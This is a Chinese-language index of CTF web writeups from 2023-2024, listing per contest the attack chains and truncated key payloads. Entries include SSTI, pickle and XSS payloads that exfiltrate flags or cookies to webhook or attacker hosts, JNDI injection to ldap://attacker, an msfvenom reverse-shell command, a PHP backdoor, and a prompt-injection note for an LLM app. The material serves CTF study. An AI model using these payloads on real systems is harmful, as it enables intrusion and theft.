---
title: Des-CTF 语料索引 — Web（2023-2024）（150 篇比赛 WP）
tags: [source-index, corpus, des-ctf, wp, web]
category: web
triggers: ["RCE", "nmap", "ssti", "ret2libc", "htb", "pentest", "flask", "XSS", "RSA", "命令注入", "Kubernetes", "LFI", "solidity", "prototype-pollution", "jinja2", "path-traversal", "csrf", "race-condition", "AES-CBC", "内网渗透"]
created: 2026-11-01
updated: 2026-11-01
sources: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge]
---

# Des-CTF 语料索引 — Web（2023-2024）

## Summary

外部语料库 `Dest1ny-Sec/Des-CTF-Knowledge` 中 **150 篇 Web（2023-2024） 比赛 WP**（覆盖 135 场比赛）的结构化索引。
每条记录保留「比赛 → 题目/攻击链 → 关键 payload → 要义」，原始全文未镜像，需细节时按 `contest` 回源 GitHub 的 `CTF大赛WP集合/articles/<文件名>.full.md`。

## Key Points

- 高频考点（按 tags 词频）：RCE、nmap、ssti、ret2libc、htb、pentest、flask、XSS、RSA、命令注入、Kubernetes、LFI、solidity、prototype-pollution、jinja2
- 高频比赛：Real World CTF 2023、春秋杯、红明谷杯、西湖论剑、阿里云CTF、长城杯、2024 春秋杯网络安全联赛夏季赛、CISCN
- tags 来自上游 frontmatter（允许跨赛道噪声，如 Web 页出现 ret2libc），仅作检索线索
- 用法：Grep 本页的比赛名或考点词 → 命中条目 → 需要细节时回源原文；不要在本页上做二次推理

## 按比赛分组

### 0CTF/TCTF 2023（1 篇）
- CSP nonce 爆破 + CSS 属性选择器 + webkit-cross-fade exfil → `aaa\`；CSP nonce 太短可爆破；style-src unsafe-inline 配合 CSS 属性选择器可偷 nonce；web…

### 2023 D^3CTF (AntCTF x D^3CTF)（1 篇）
- 2023 D^3CTF：Python list(dict()) 沙箱逃逸 + FilesystemAdapter zip 命令注入 + d3sky XOR ring → `ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])…`

### 2023 NKCTF (南开 CTF)（1 篇）
- NKCTF 2023：PHP 全角字符 + PDF-RCE + ZenTao CVE + APK + BMP stego → `$_=(０/０)._;$_=$_[''=='$'];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_='_'.$__.($_++).$_;$$_[__…`；PHP 0/0=NAN + 全角字符是字符构造经典；PDF 内嵌 JPG 触发是 0day 利用；禅道 pms CVE 是国内常见

### 2023 WIDC 世界智能驾驶挑战赛 (ChaMd5)（1 篇）
- 2023 WIDC 智驾：pickle + Node template + RSA-1 sympy + RSA-2 gcd + pwn → `pickle: builtins.getattr(dict.get(''eval'')(open(''/f1ag'').read()))`；智驾安全涵盖 web + crypto + pwn；pickle 反序列化链 getattr/dict.get 经典

### 2023 37C3 Potluck CTF（1 篇）
- 37C3 Potluck CTF Hungry Helmsman — Kubernetes RBAC+PodSecurity+ResourceQuota+NetworkPolicy 链：拿…；K8s RBAC 边界是 namespace；PodSecurity restricted 是 v1.25+ 默认；Network…

### 2023 ACS CTF（1 篇）
- ASEAN ACS CTF 2023 — is_numeric 弱类型 + preg_match /^[0-9...]/i %09 旁路 + PHP_SESSION_UPLOAD_PROGR…；is_numeric 接受 '\t1' '\n1' 等;PHP_SESSION_UPLOAD_PROGRESS 是 LFI-to-…

### 2023 Apiculture (养蜂业 API 挑战)（1 篇）
- 旧版 API + DOCX 元数据 OSINT + 4 位 PIN 爆破 → `POST /API/v2/users/reset3 { aes256Payload, sms4digits: 0000-9999 }`；API 弃用版本不删是常见漏洞；DOCX/PPTX 元数据泄露作者；4 位 PIN 暴力无防是经典

### 2023 BreizhCTF（1 篇）
- BreizhCTF 2023 Ariane Chat：NestJS + socket.io 服务端原型污染 (SSPP) 提权为 admin。 → `banClient({message: ''isAdmin'', reason: ''true''})`；当 admin 标志在字符串 truthy 检查且 Object 原型被污染时，所有 Client 实例都自动成为 admin。

### 2023 CISCN（2 篇）
- CISCN 华东北 2024 狼组复盘 — SSTI 禁 print 用 cycler.__globals__.__builtins__.__import__ 拿 os.popen + ph…；SSTI 沙箱常禁 print 但 __globals__.__builtins__.__import__ 仍可绕;SQL 大小写…
- CISCN 2023 华东南分区赛 8 道 WEB 官方 WP 集合，覆盖 Java 反序列化/PHP XXE/Python SSTI/Node WebSocket。 → `SimpleCache$StoreableCachingMap 反序列化 + 软链接穿越`；现代 CTF WEB 越来越"工业化"——一题往往综合序列化+文件读写+反序列化链+沙箱绕过，单纯一类洞不够。

### 2023 CTFShow（1 篇）
- CTFSHOW 第三届愚人杯 — 12+ 题合集: PNG CRC32 反推 + Ook 语言 + PHP base64 任意文件读 + 反序列化 4 步链 + Caesar + Flask…；愚人杯风格是 1 道题多种 trick 混合;PNG CRC32 反推宽高是经典;反序列化 4 步链 (destruct → to…

### 2023 D3CTF（1 篇）
- D3CTF 2023 Polaris 战队 WP，Web/Misc/RE 三大块，含 Casino/Base64 绕过/gif 像素解。 → `unicode 旁路关键字 + 91 字节合约 + prime 拓展 key`；CTF 越来越像"全栈工程"——Solidity 合约/字节码优化/python 图像/RC4 数学全都要会。

### 2023 DASCTF（1 篇）
- DASCTF 2023 4 月 EDI 战队招新+4 题：ECC 还原/Carmichael LLL/file 覆盖 pwn。 → `ECC 曲线还原 + LLL 还原 Carmichael`；当 ECC 给出 3 个点 (x, y) 满足 y²=x³+ax+b mod n，可以列两个方程解 a, b mod n。

### DEFCON 31 (Quals 2023)（1 篇）
- DEFCON 31 REST-AND-ATTEST：智能锁固件证明Rust程序 → `get_new_image()? // user input image`；固件证明（attestation）基于Root of Trust的固件安全

### 2023 EJS CTF（1 篇）
- CTF EJS 漏洞笔记 — Express + EJS + res.render('index', req.query) 污染 settings['view options'] + out…；EJS render(view, options) 把 options 传到 View 内部,污染 settings/opts 是…

### Google CTF 2023（1 篇）
- Google CTF 2023 v8box：V8 sandbox+code pointer sandbox+JITless → `v8_enable_sandbox=true + v8_code_pointer_sandboxing=true`；V8 sandbox模式开启后内存破坏API需特殊配置

### HITCON 2023 x DEVCORE Wargame（1 篇）
- HITCON 2023 Wargame My todolist：Json.Net反序列化+RolePrincipal+Process.Start → `$type=System.Web.Security.RolePrincipal + Process.StartInfo /c calc`；Json.Net TypeNameHandling=All配合RolePrincipal gadget可RCE

### HITCON CTF 2023 Quals（1 篇）
- HITCON CTF 2023 Lisp.js jail：递归caller 7次拿到module→execSync读flag → `7次 .caller拿module wrapper → require("child_process").execSync`；Function.caller + 递归拿Node.js module wrapper是Node jail经典逃逸

### Hack.lu 2023（1 篇）
- Hack.lu 2023 K8s：CRD Flagrequest+operator+anti-bruteforce token → `metadata.name=give-flag + labels.hack.lu/challenge-name=give-flag + spec.anti-bruteforce=B…`；K8s CRD challenge常需理解operator watch流程+反token条件

### HackPack CTF 2023（1 篇）
- HackPack 2023：Nunjucks SSTI外带+SQL注入双引号闭合 → `{{process.mainModule.require(''child_process'').exec(''curl ...?$(cat flag.txt / base64)''…`；Nunjucks SSTI {{process.mainModule.require}}可执行命令

### 2023 HackTheBox（2 篇）
- Hack The Box PC 题，gRPC 50051 端口反射枚举 + LoginUser 用户枚举 + pyload SSH 登录。 → `端口 22 + 50051 (gRPC) SimpleApp.LoginUser Python gRPC client`；rustscan 比 nmap 快的现代端口扫描器；gRPC 服务默认在 50051 端口，需用 grpcurl/evans 工具…
- Hack The Box Sandworm 中等题，Flask Web + JWT 伪造 + RADIUS 协议深度利用链。 → `ssa.htb Flask PyJWT RADIUS protocol`；dirsearch 找 admin/login/logout 路由；ffuf 高并发子目录爆破；Flask + PyJWT 是 H…

### 2023 HackTheBox Bagel（1 篇）
- HTB Bagel：Flask 8000端口LFI读源码+WebSocket → `curl 'http://bagel.htb:8000?page=../../../../../../etc/passwd'`；Flask ?page=参数易出LFI，可读/proc/self/cmdline定位应用

### 2023 HackTheBox Inject（1 篇）
- HTB Inject：Spring Cloud Function RCE 反弹shell → `spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tm…`；Spring Cloud Function SpEL表达式注入RCE

### 2023 HackTheBox Stocker（1 篇）
- HTB Stocker：ffuf vhost爆破dev.stocker.htb子域；Vhost爆破是发现子域名隐藏功能的高效方法

### HackTheBox University CTF 2023 - PhantomFeed（1 篇）
- HTB University 2023 PhantomFeed 全链：register 竞态 (ReDoS 延迟) → 拿 JWT → feed market_link 触发 bot 访问… → `color=[[[getattr(pow, Word('__globals__'))['os'].system('wget webhook?$(cat /flag*)') for…`

### 2023 Intigriti（1 篇）
- JavaScript Math jail 不让用 'alert' 字符串 / Function / 直接弹窗，从 Math 全局对象反射出字母和字符路径，绕过字符串黑名单。

### Intigriti CTF 2023（1 篇）
- Intigriti CTF 2023：WebSocket 盲注+JWT 爆破+原型链污染+puppeteer path 注入。；puppeteer page.pdf() 的 path 选项可控可写文件；JSON 写入可污染 isAdmin 字段。

### JustCTF 2023（1 篇）
- sqlite3 三种代码执行姿势：load_extension SMB / writefile 落 .so / 自定义函数 .open :memory:。；sqlite3 的 load_extension 允许任意 .so/.dll，是 PWN 题沙箱逃逸金钥匙；.open :memo…

### LakeCTF 2023（1 篇）
- LakeCTF 2023 GeoGuessy 三种 premium 取法：同域 9009 反射 XSS 跨端口 + 全局 user 变量 race condition 注册覆盖 + 预期解… → `REFLECTED_XSS = urllib.parse.quote_plus(f"<script>fetch('{WEBHOOK}?'.concat(document.cooki…`

### Northsec 2023 (Windows Track)（1 篇）
- Northsec 2023 Windows 域攻击链：IPv6 主机发现 + RunUpdate.bat net use 暴露 NFS 凭据 + rot47 解密 + rbcd RBCD 委… → `net use z: \NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:bank\ATMService / rbcd.py -action wr…`

### 2023 RWCTF（1 篇）
- RWCTF 2023 HappyFactory 区块链题，自定义 UniswapV2 复刻的 LP 攻击。 → `自定义 UniswapV2 复刻 + LP 累积攻击`；当 DEX 是 UniswapV2 复刻时，要特别留意 feeTo / feeToSetter 等管理函数是否可调用。

### Real World CTF 2023（3 篇）
- Real World CTF 2023 The cult of 8 bit：Node EJS URL 弱过滤 + JSONP callback %23%00 切断 + 16 iframe f… → `text = "[](javascript:alert())" / JSONP /api/post/{id}?callback=our_function%23%00 / alpha…`
- Realworld CTF 2023 ChatUWU：socket.io parseuri 正则对 location.search 中 @ 符号处理错误导致 socket 客户端连接攻击者服… → `socket = io('/${location.search}') / payload: /?room=DOMPurify&nickname=guest5279@85.244.2…`
- Realworld CTF 2023 The cult of 8 bit 详解：JSONP callback SOME 攻击 + XHR %00 报错触发 fallback + iframe… → `?id={uuid}%00 让 XHR.open 报错 / ?id={uuid}%3Fcallback=alert%23%00 切断 callback / iframe.allow…`

### Realworld CTF 2023（2 篇）
- Realworld CTF 2023 ChatUWU：socket.io 聊天室 DOMPurify 0.24 房间渲染 + parseuri 正则 @host 解析错误 → 攻击者控制 s… → `http://target/?room=DOMPurify&nickname=guest5279@attacker.com:9000`；socket.io + parseuri 正则 @authority 解析错误是 web 经典高阶利用；房间级 isHtml 标志…
- Realworld CTF 2023 The_cult_of_8_bit：JSONP callback + URL %00 截断 + opener opener 跨窗口访问 admin ho… → `opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].child…`

### 2023 SECCON CTF（1 篇）
- JWT alg 注入 prototype pollution + CSP Host 头污染 XSS 拿 flag → `header = {"alg": "constructor", "typ": "JWT"}; payload = {"isAdmin": true}; token = base64…`；JWT 库用字典查算法时 alg 字段可被注入到 Object 原型链；CSP 中 default-src 接受 Host 头参数…

### 2023 Security-JAWS DAYS（2 篇）
- Security-JAWS DAYS 2023 AWS 渗透综合题：nginx alias LFI → S3 桶列 → IAM 越权 → Lambda 老版本下载 → RDS 提权。 → `aws lambda get-function --function-name 'arn:aws:lambda:ap-northeast-1:055450064556:functi…`
- Security-JAWS 作問者解説：AWS IMDS 主机名黑名单 9 种绕过 (8/10/16 进制 + 短链 + nip.io) + DynamoDB + RDS + Conflue… → `0251.254.000251.0000376`；任何 IP 字符串黑名单都有数十种 bypass，正确的解法是 enum IMDS endpoint 调用而非字符串匹配。

### 2023 Source Zero Con（1 篇）
- Source Zero Con 2023 Compromised：PHP 后门 + 链式自增/异或构造 dynamic function。 → `$_($$_55[_]) # system($_POST[''_''])`；短小 PHP 后门常用反引号 + 自增 + 异或绕静态分析；运行时 payload 拆分是关键。

### 2023 TCP1PCTF（1 篇）
- TCP1PCTF 2023 Un Secure：PHP 反序列化 gadget chain 3 件套 + 反射 + 字符串拼接 RCE。 → `cookie=base64(O:17:"GadgetTwo\Echoers":1:{s:8:"*klass";O:16:"GadgetOne\Adders":1:{s:19:"Ga…`；PHP Gadget 链常以「destruct→call→toString→eval」为模板，命名空间 (GadgetOne/Tw…

### 2023 TQLCTF (More Secure Pastebin)（1 篇）
- TQLCTF More Secure Pastebin 实战时间盲注绕过，用浏览器 fetch + Date.now() 测 MongoDB RegExp 搜索响应差，通过 Promise.… → `word=flag{aa / word=flag{ab / Date.now() 测量 fetch ms / Promise.all([p1,p2]).then(1/-1) / t…`

### Tet CTF 2023（1 篇）
- Tet CTF 2023 mailService PWN：发邮件主题注入 content_path=/proc/uptime 读内存 + size=-1 整数溢出 + 邮件内容 2048+… → `subject = b'xxxxxxxxxx' + b'aaaa;content_path=/proc/uptime\x00' * 70 / size = b'-1' / payl…`

### 2023 TetCTF（1 篇）
- TetCTF 2023 + Liferay CVE-2019-16891 Pre-Auth RCE：hibernate JNDI 注入 + image download SSRF + URI… → `ldap://attacker # 注入 hibernate sessionFactoryJNDIName`；Liferay JSON Web Service 反序列化是真实存在风险点；file:// 协议 + URI regex auth…

### Ugra CTF Quals 2023（1 篇）
- 俄语 Ugra 资格赛杂烩 WP，三段式 flag + XSS 偷管理员 + 缩略图取证 + Python 切片回推 + rot13 等价链。 → `<script>window.open('http://x/xss.php?msg='+encodeURI(document.body.textContent))</script>…`；字符串/字节反转 + little-endian + sum(ord*1000**i) 是 flag 还原三大套路，几乎所有 RE…

### 2023 WIZ The Big IAM Challenge（1 篇）
- WIZ The Big IAM Challenge 5 关 AWS IAM 策略误配置利用：公共 S3 桶+SQS ReceiveMessage+SNS 订阅+PrincipalArn 条件… → `aws sqs receive-message --queue-url https://queue.amazonaws.com/092297851374/wiz-tbic-anal…`

### WMCTF 2023（1 篇）
- WMCTF 2023 Mini-Venom 战队 4 题 WEB WP 速记，模板 SSTI 路径可控 + 路径穿越 + MySQL load_file 读 pm2 日志 + general… → `/post/11 union select load_file('/home/ezblog/.pm2/logs/main-out.log') / SET GLOBAL genera…`

### WaniCTF 2023（1 篇）
- WaniCTF 2023 全题型 WP，IndexedDB 浏览器数据 + zip 路径穿越 + HTTP Range 2GB 偏移 + AWS Lambda IAM 权限提升 + Imag… → `openRequest.onupgradeneeded = {objectStore.put({name:"FLAG{[redacted]}"})} / Range: bytes=…`

### Wiz EKS Cluster Games 2023（1 篇）
- Wiz EKS 5 关云原生攻击链：RBAC 读 secret → imagePullSecrets 拉镜像 → IMDS 提 AWS 凭证 → ECR 历史泄密 → IRSA Assume…；K8s 攻击面按 RBAC→Secrets→IMDS→IRSA 层层升级；aws sts get-caller-identity…

### 2023 corCTF+Sekai（1 篇）
- corCTF 2023 + Sekai CTF 2023 跨比赛笔记合集，XS-Leak + RCE 双重攻击面。 → `WebRTC STUN 子域 / font-face 字符时延 / HTTP smuggling CL.TE`；现代 WEB 难度的天花板在 corCTF/Sekai 级别——纯前端 XS-Leak + 协议层 RCE + 信息泄漏组合拳。

### idekCTF 2023（1 篇）
- 5 道高质量 Web：pydash 链污染+urllib fragment 拆分+flask session 伪+Go bufio 越界+php filter chain 预置 FREE。；pydash.set_ 走 Python 属性路径可污染 Flask jinja_env；urllib _splittag 用 %…

### 2023 ångstromCTF（1 篇）
- ångstromCTF 2023 综合 WP，覆盖 Web 入门到 Jinja2 SSTI 提权、Misc 文件还原、Crypto RSA/LFSR/坐标下降等多个领域。 → `hallmark.svg = <svg><script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;...;…`

### 上海大学生网安大赛 2023（1 篇）
- 上海大学生 8 题：cookie 窃取+vm2 sandbox+Spring 反序列化+无参数 RCE+Python 沙箱+KeyBox 整数溢出。；vm2 3.9.16 用 Error+Proxy+apply 绕过；Spring Boot 原生反序列化走 AliyunCTF b…

### 2023 上海市大学生网络安全大赛(磐石行动)（1 篇）
- 4个漏洞挖掘场景,官方完整攻击链:SQLServer→xp_cmdshell→badpotato→hash传递→noPac域提权/Confluence→Linux Vim-SUID→MySQ… → `xp_cmdshell/badpotato/CVE-2021-42278+CVE-2021-42287/Vim-SUID//opt/jumpserver/config/config…`

### 2023 区块链DeFi（1 篇）
- 操纵预言机(ApplePool):DeFi UniswapV2预言机价格操纵套利token3耗尽isSolved。 → `UniswapV2预言机价格操纵 + token3耗尽isSolved + safemath整数溢出防护`；DeFi预言机操纵经典攻击:UniswapV2的getReserves()或balanceOf()直接作为价格源易被大量swap操…

### 安洵杯 2023（1 篇）
- 6 道综合：CommonsBeanutils 反射 + Spring FreeMarker + RSA 位翻转 + AES padding oracle + CRT RSA。；黑名单 ban 反射 + Runtime + TemplatesImpl 改用 PropertyUtilsBean；FreeMar…

### 2023 广东大学生网络安全攻防大赛决赛（1 篇）
- 6道Web题(目录:index.php/mc-admin/mc-files/posts/pages),涵盖xhcms+ThinkPHP+mc-core.php+后台admin/Upload,… → `data={"1": "system(''cat /flag'');"}/?file=/flag/form_id="system(''cat /flag'');"/file_typ…`

### 2023 强网拟态防御（1 篇）
- 第六届强网拟态防御ChaMd5 Mini-Venom WP,4题:Web(minihttpd remove_path+create/zip/unzip/clear)+Crypto(RSA n… → `?action=create&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp///for r in range(0,2**…`

### 强网杯2023Final（1 篇）
- 强网杯2023Final D8 V8利用:CVE-2023-4427 enum_cache越界读→PropertyArray r/w→WASM shellcode执行。 → `map-updater.cc删除InitializeFastPropertyEnumCache + obj.a/b/c/d/e属性触发enum_cache未初始化`

### 数字网络安全人才挑战赛 2023（1 篇）
- 综合 6 题：SSRF+gopher+SQL 盲注绕过滤+HNP 格+DH CRT+TEA 变种+pwn 起源 ROP。；proc/net/arp 替代 127 关键字查内网；SQL 注入禁 union 用 if + 禁 substr 用 ord/le…

### 2023 春秋云镜靶场（2 篇）
- 春秋云镜Initial：ThinkPHP5+MS17-010+secretsdump/wmiexec横向三件套 → `fscan -h 172.22.2.1/24;ms17_010_eternalblue;secretsdump.py XIAORANG-WIN7$@172.22.1.2;wmiex…`；入门靶场：web RCE→frp代理→MSF永恒之蓝→impacket工具链横向
- 春秋云镜Initial完整打靶：ThinkPHP+信呼OA+MS17-010+黄金票据四步全flag → `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls;set global genera…`；入门靶场三种getshell姿势（ThinkPHP/信呼上传/phpMyAdmin日志写马）+ Kerberos黄金票据原理与利用

### 2023 春秋杯（3 篇）
- 2023 春秋杯冬季赛 Web/Pwn WP，customer-broker-merchant 队列系统 + PHP 反序列化 Redis Rogue Server + picup SSRF… → `redis-rogue-server.py --server-only dict://127.0.0.1:6379/config:set:dir:/tmp`
- 2024 春秋杯夏季赛 brother 出题思路，SSTI 反弹 shell + sql-proxy.jar Java agent hook send + MySQL UDF 提权。 → `SQL proxy: sourcePort=6666 destPort=3306 UDF so: /app/evil.key tarfile 软链接覆盖`
- 春秋杯 Java Agent 攻击：URL 解析绕 Filter + SPEL 注入 + Java agent 插桩 ActiveMQ broker 攻击 merchant 提权。；Java agent 插桩是横向移动的高阶武器；URL 解析差异（; 截断）可绕黑名单 filter；OpenWire 协议 co…

### 春秋杯冬季赛 2023（1 篇）
- 春秋杯冬季赛综合：外卖 ZIP 隐写+明文爆破+OpenSSH ProxyCommand+Redis 主从复制+Python pickle 沙盒。；CVE-2023-51385 走 .gitmodules 注入 nc/bash；Redis 主从复制 + dict:// 协议是…

### 春秋杯春季赛 2023（1 篇）
- 春秋杯 EDISEC 11 题：phpstudy+pickle+SSTI+Pell+EC_ElGamal+数独 md5+TEA 36 轮+pyinstxtractor。；数独答案 9 个 1-9 之和恒为 405，md5 即可；VMP 字符串改 UPX 是经典脱壳绕过；pyinstxtractor+…

### 江苏信息通信行业网安竞赛 2023（1 篇）
- 江苏信息通信综合 7 题：php_trick 多重绕+USB 流量+SlientEye+AES 爆破+LCG+RSA+花指令。；substr 数组绕过 + con %0a 绕正则 + dadata 协议绕 str_replace；LCG 6 组输出即可还原…

### 2023 第七届强网杯（1 篇）
- 第七届强网杯Web：xcache只读保护+mmap两次+xc_php_find_unlocked hook+函数指针patch → `xcache read only protection;mmap两次0x4000000间隔;ro_addr=0x7fb5ed09c000;rw_addr=0x7fb5ed09c00…`；xcache启用read-only protection时同文件被mmap两次（ro+rw），攻击者需patch映射到rw区域

### 2023 第七届蓝帽杯初赛（1 篇）
- 第七届蓝帽杯初赛LovePHP：my[secret.flag绕过+Serializable接口绕过__wakeup+php://filter字符oracle → `my[secret.flag绕过[;C:8:"Saferman":0:{} Serializable接口绕过__wakeup;file($_GET['secret']);php:/…`

### 2023 红明谷杯（2 篇）
- CMS 后台任意文件读 + 主题包覆盖 + DNS XOR 带外 + DNA 密码替换。 → `../../../../../../../../../../flag ; myBean.setDatabase("mysql://vps:3306/test?user=filere…`；PHP 字符串重组绕过检测有限，但 Ceye.io + XOR 密钥拼接泄漏仍是经典外带思路。
- 第四届红明谷杯卫星应用WEB 4题:PHP-Filter链oracle读源(synacktiv工具)+匿名类anonymous\0/var/www/html/flag.php:7$0+pcn… → `?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0/pcntl_exec("/usr/bin/python",array…`

### 2023 西湖论剑（2 篇）
- Node 异常泄露 + 自定义 SO 加密 + Unicode HTTP 拆分污染 + Fastjson TemplatesImpl + codefever implode 注入。 → `{"constructor.prototype.outputFunctionName":"x;global.process.mainModule.require(''child_p…`
- session 已知明文还原 XOR key + pop 链改 admin 密码 + 后台 phar 上传 RCE → `namespace PHPEMS { class session { public function __construct() { $this->pdosql = new pdo…`；PHP 自定义 session 加密可用已知明文 (client IP/time) 反推 key；PDO prepare 字符串拼…

### 观安杯 2023（1 篇）
- AWDP 实战：pma 弱口令+CVE-2018-12613 读 flag + ThinkPHP6 反序列化 RCE。；AWDP 关键是抢弱口令（ctf:ctf 通用）+ pma 后台任意文件读 + ThinkPHP6 反序列化链广存。

### 2023 阿里云CTF（2 篇）
- Struts2 OGNL 双重 URL 编码 + Solidity MerkleProof 数组错配 + IoT 模拟器 + 异或差分逆 C。 → `"(#r="a".getClass().forName("java.lang.Runtime")).(#m=#r.getDeclaredMethods().{^ #this.nam…`；Solidity MerkleProof 验证时 array.length 检查不严时可手动配错位绕过；OGNL 表达式 WAF…
- 阿里云CTF 2024 El3ctronic战队第四名全方向:web签到Pastbin+easyCAS+Re欧拉+sign_in溢出ret2libc+klang编译器fuzz类型混淆写she… → `data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0=//fla…`

### 2023 鹏程杯（1 篇）
- PHP 反序列化 + Spring Boot Swagger + Tera SSTI + 数组绕 strlen + ORW + babyheap off_by_null + XOR0x23… → `netdoc:///flag%23.html ; username=admin&title[]=2.php&data[]=<?='tac%20/f*' ; payload = b"…`

### 2023 黑盾杯（1 篇）
- c3p0+MySQL JDBC 读本地 + Flask 装包 RCE + SROP + house of orange 改 top chunk。 → `MyBean.setDatabase("mysql://vps:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINF…`

### 2024 数信杯西区（1 篇）
- 西区数信杯安全加固+应急：ssh/apache/redis 三件套 + Openfire 9090 改端口 + SQL 盲注二分 + 后门清理 + 凯撒密码+base64。 → `extract_data_from_logs: ascii_match + response_pattern + 二分 127 范围`；SQL 盲注即使有 WAF 也可走 HTTP 响应长度二分：920/940 长度差判 ascii(substr(...))>N，每…

### 2024 春秋杯网络安全联赛夏季赛（2 篇）
- 春秋杯夏季赛三大 crypto + 一 web：Hijack LD_PRELOAD + ezecc gcd 求 ECC 曲线 + Signatrue DSA nonce 复用 HNP 格 +… → `p = gcd(G[0]^3 + a*G[0] + b - G[1]^2, c1[0]^3 + a*c1[0] + b - c1[1]^2)`
- 春秋杯夏季赛 web 三题：Java 代理 javaagent hook MySQL 流量 + /evil 代码执行 + PHP 多层 php://filter 解压 data URI +… → `ENV.__toString: putenv("$key=$value"); system("cat hints.txt")`；Java Proxy 透明代理+javaagent hook 是 CTF 高级 web 套路：拿到 jar 注入 javassis…

### 2024 第四届红明谷（1 篇）
- 红明谷 Mini-Venom 综合：PHP Basic 鉴权 + Spring SpEL RCE + PHP 8 anonymous class 文件名 0x00 截断 + Rust 内联汇… → `Spring SpEL: T(Runtime).getRuntime().exec(''calc'')`；Spring SpEL 注入通过 '[[${...}]]' 触发，'T(Class).forName' 反射调用是经典 paylo…

### 2024 第四届网鼎杯 青龙组（1 篇）
- 网鼎杯 2024 青龙组：XSS admin-bot exfil + 栈迁移 pwn + SM4 加密 → `<script>fetch('/flag').then(...).then(...)</script> + submit`；存储型 XSS 必须靠 admin 触发；栈迁移到泄露地址可绕小 buffer；SM4 是国产商用密码

### 2024 软件供应链安全技能竞赛（1 篇）
- 14 flag 全网段综合：禅道/YARN/向日葵/ThinkPHP/Docker Registry/jumpserver 模板/ThinkPHP 链——把企业软件开发-测试-生产-运营商四… → `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port -f elf > a`

### 2024 AVSS（1 篇）
- AVSS 2024 Final — _jsbridge add/edit/show/delete + heap 0x90 重叠 (del 偶数+add 奇数) + show 0x8 找指针…；堆重叠经典模式:交错 add+del 偶数,add 奇数回收;show 部分字节是找指针的标准做法;JS bridge 类型混乱是…

### 2024 AWD 入门（1 篇）
- AWD 离线 Jar 冷补丁 — Spring Boot DocToolkit + CFR 反编译 + javac 重编译 (ShiroConfig+UserRealm+AdminContr…；Spring Boot jar 冷补丁关键在 BOOT-INF/classes/ + BOOT-INF/lib 双层结构;CFR-…

### 2024 BYUCTF（1 篇）
- 时间戳爆破 JWT secret + meta refresh SSRF + pickle RCE + secret cookie bypass → `class RCE: def __reduce__(self): return os.system, (''cat /ctf/flag.txt/curl https://[your…`

### 2024 BuckeyeCTF（1 篇）
- BuckeyeCTF 2024 狼组复盘 — Web SSFS uuid 目录穿越 + Pwn runway0/1/2 栈溢出 + calc canary 泄 + color 字符串回显 +…；入门级赛事风格:目录穿越/栈溢出/canary 泄 全覆盖;uuid 文件服务常见目录穿越;calc 类题目 'pi' 触发 ca…

### 2024 BuildCTF（1 篇）
- BuildCTF 2024 Web 方向 AK 全解，13 道题覆盖 ID 爆破/htaccess/headers/SSTI/反序列化/JWT/字符 case-folding 漏洞。 → `admin token 伪造 + JWT_SECRET_KEY + ffifdyop MD5 注入 + ı/ſ 字符 case-folding`；Character.toUpperCase() 中 'ı'→'I' 'ſ'→'S' 是 Java 经典 Unicode case-…

### CrewCTF 2024（1 篇）
- CrewCTF 2024 2题：Rust Host头绕过+ping2 bat命令注入，4层pcapng → `GET /ai/run?cmd=ping2&arg=%25CMDCMDLINE%3a~-1%25%26type.exe%20flag.txt HTTP/1.1`；%CMDCMDLINE%环境变量+Windows批处理可绕字符过滤

### DiceCTF 2024 Quals（1 篇）
- DiceCTF 2024：JS鸭子游戏+SQL注入+原型链污染+EJS SSTI → `user=__proto__&pass='%20union%20select%20'1`；SQL注入+'__proto__'污染isAdmin对象可绕过认证

### 2024 H&NCTF（1 篇）
- H&NCTF 2024：flipped AES-CBC 翻转 + ELF 自修改还原 + VBScript RC4 + 32-bit ret2libc + 八卦符转义。 → `c[default_session.index("0")] ^= 1 # 翻转 admin 字节`；32-bit PWN 32-bit canary 通过一个负数 -32 长度 leak 后爆破是经典手法。

### HITCON CTF 2024（1 篇）
- HITCON CTF 2024 Web3：Ilus接口+多Gem合成+stage通关 → `lus.create_gem() payable + merge_gems() + assign_gem(uint32)`；Solidity 0.8+接口题常需读懂Game/Attack/Verify三合约关系

### HKCERT CTF 2024（1 篇）
- HKCERT 2024上篇覆盖Flask+PDF生成器+自定义C服务端+JSPyaml+奇美拉五道Web+两道Misc+Forensics的混合WP，亮点在pyodide+js-yaml-j… → `GET /../../../../../../../flag.txt.js`；现代Web常把yaml.load+扩展schema(js/function)+pyodide+pyodide.code.run_j…

### 2024 HackPack CTF (LLM挑战)（1 篇）
- HackPack LLM挑战：YellowDog编号枚举+pixel-bot prompt injection → `改carolina89编号; prompt injection绕过google限制`；LLM应用安全常结合prompt injection+IDOR+SSRF

### 2024 HackTheBox Office（1 篇）
- HTB Office打靶：Joomla API未授权用户枚举 → `curl -v /api/index.php/v1/users?public=true`；Joomla /api/index.php/v1/users?public=true可枚举所有用户

### 2024 ImaginaryCTF（1 篇）
- ImaginaryCTF 2024 Web 多题速查 (nginx 路径规范化 / Python 代码注入 / Hostname 报错 / PHP assert 注入 / maze 条件竞争…

### 2024 Insomni'hack（1 篇）
- Insomni'hack 2024 Windows MSRPC 服务的状态机题，靠调不存在的 opnum 42 触发异常前 authorization 已被缓存的设计漏洞。 → `/`；/

### 2024 IrisCTF（1 篇）
- IrisCTF 2024 多类目 writeup (Web SQL 注入 / Puppeteer 自动化 / ssh2john / aircrack-ng / FTP 爆破 / fish 拼…

### 2024 JerseyCTF（1 篇）
- JerseyCTF 2024 多类目 writeup (Web log4j/Apache 2.4.49 / Pwn shellcode/ret2libc / Misc 频谱 / Revers…

### 2024 L3HCTF（1 篇）
